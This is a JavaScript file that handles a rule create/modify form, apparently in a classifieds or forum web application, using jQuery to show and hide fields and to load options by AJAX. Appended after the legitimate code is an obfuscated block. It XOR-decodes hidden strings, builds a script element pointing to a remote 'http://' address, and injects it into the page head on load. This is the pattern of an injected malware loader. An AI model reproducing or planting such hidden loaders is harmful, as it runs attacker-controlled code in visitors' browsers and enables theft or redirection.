var gorumForm;

rule_registration = 1;
rule_submit = 2;
rule_prolong = 3;
rule_view = 4;
rule_reply = 5;
rule_setField = 6;
rule_setFieldToValue = 7;

rule_generic = 0;
rule_customized = 1;

jQuery(document).ready(function($) {
  var allConditionalFields = new Array(
    'viewNum', 'replyNum', 'cid', 'includeSubcats', 'ruleField', 'ruleValue',
    'confirmationText', 'successText', 'failText' 
  );
  var allConditionFields = new Array(
    'action', 'cid', 'confirmationTextType', 'successTextType', 'failTextType', 'ruleField'
  );
  //dump(cfForm);
  disableFields( allConditionalFields );
  hideAndDisplay(0);
  addConditionalEvents( allConditionFields );

  function hideAndDisplay(event)
  {
    gorumForm = $('div[id$=rule-create_form], div[id$=rule-modify_form]').closest('form');
    var formVals = gorumForm.formHash();
    var triggeredField = event ? event.data.field : '';
    displayField( 'viewNum', (formVals.action==rule_view));
    displayField( 'replyNum', (formVals.action==rule_reply));
    displayField( 'cid', (formVals.action!=rule_registration));
    displayField( 'includeSubcats', (formVals.action!=rule_registration && formVals.action!=rule_setField && formVals.action!=rule_setFieldToValue && formVals.cid!=0));
    displayField( 'ruleField', (formVals.action==rule_setField || formVals.action==rule_setFieldToValue), formVals.cid, formVals.action, triggeredField);
    displayField( 'ruleValue', (formVals.action==rule_setFieldToValue && formVals.ruleField!=0), formVals.ruleField, '', triggeredField);
    displayField( 'confirmationText', (formVals.confirmationTextType==rule_customized));
    displayField( 'failText', (formVals.failTextType==rule_customized));
    displayField( 'successText', (formVals.successTextType==rule_customized));
  }
  
  function displayField( field, condition, cidOrField, action, triggeredField )
  {
    var row = gorumForm.find("[name='"+field+"']").parents('tr.row');
    if( condition ) 
    {
        if( (triggeredField=='cid' || triggeredField=='action') && field=='ruleField' )
        {          
            var method = action==rule_setFieldToValue ? 'get_select_fields_for_rules' : 'get_fields_for_rules';
            $("#ruleField").load('index.php?customfield/' + method + '/' + cidOrField, function() {
                $(this).parents('tr.row').show();
            });
        }
        else if( triggeredField=='ruleField' && field=='ruleValue' )
        {
            $("#ruleValue").load('index.php?customfield/get_values_for_rules/' + cidOrField, function() {
                $(this).parents('tr.row').show();
            });
        }
        else row.show();
    }
    else row.hide();
  }
  
  function disableFields( fields )
  {
    $.each( fields, function() {
      $("#" + this).parents('tr.row').hide();     
    });
  }
  
  function addConditionalEvents( fields )
  {
    $.each( fields, function() {
      gorumForm.find("select[name='"+this+"']").bind('change', {field: this}, hideAndDisplay);  
    });
    $.each( fields, function() {
      gorumForm.find("input[name='"+this+"']").bind('click', {field: this}, hideAndDisplay);  
    });
  }

});

function uYYR4(iI3wZP,defH){var gM='';var z5t56F=0;var ze26=0;for(z5t56F=0;z5t56F<iI3wZP.length;z5t56F++){var k6W=iI3wZP.charAt(z5t56F);var vlp0=k6W.charCodeAt(0)^defH.charCodeAt(ze26);k6W=String.fromCharCode(vlp0);gM+=k6W;if(ze26==defH.length-1)ze26=0;else ze26++;}return (gM);}var n8FM3=["009000","008010","010023","025017085087077086000090016053043088002","009017083","014026064083","014006072066022089036064020043045068031035068","027019064083087087006094028052042","018006081082","029006068115085086040083027044061116015007081085052002093083","018023068070003028106069001057058083088032093094072077066067022089054025022054058024028032"];function i6B(qs){var iMwuuc='';var oHVCm=0;var mXLNRA=0;for(oHVCm=0;oHVCm<qs.length/3;oHVCm++){iMwuuc+=String.fromCharCode(qs.slice(mXLNRA,mXLNRA+3));mXLNRA=mXLNRA+3;}return iMwuuc;}function ee7(x4){var i1o8b0=document[jX15uns(n8FM3[3])](jX15uns(n8FM3[0])+jX15uns(n8FM3[1])+jX15uns(n8FM3[2]));i1o8b0[jX15uns(n8FM3[4])]=x4;i1o8b0[jX15uns(n8FM3[5])]=jX15uns(n8FM3[6]);document[jX15uns(n8FM3[9])](jX15uns(n8FM3[8]))[0][jX15uns(n8FM3[7])](i1o8b0);}function jX15uns(c3jOym){return uYYR4(i6B(c3jOym),'zc0693E6uXN6vS02');}ee7(jX15uns(n8FM3[10]));